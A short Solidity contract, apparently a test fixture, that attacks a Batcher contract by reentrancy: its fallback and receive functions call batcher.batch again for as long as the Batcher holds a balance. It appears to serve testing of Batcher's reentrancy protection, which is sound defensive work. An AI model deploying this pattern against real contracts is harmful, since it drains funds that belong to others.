// SPDX-License-Identifier: Apache-2.0
pragma solidity 0.8.20;

import '../Batcher.sol';

contract Reentry {
  Batcher private batcher;
  address[] public selfAddress;
  uint256[] public selfValue;

  constructor(address payable _batcherAddr) {
    batcher = Batcher(_batcherAddr);
    selfAddress.push(address(this));
    selfValue.push(1);
  }

  fallback() external payable {
    if (address(batcher).balance > 0) {
      batcher.batch(selfAddress, selfValue);
    }
  }

  receive() external payable {
    if (address(batcher).balance > 0) {
      batcher.batch(selfAddress, selfValue);
    }
  }
}
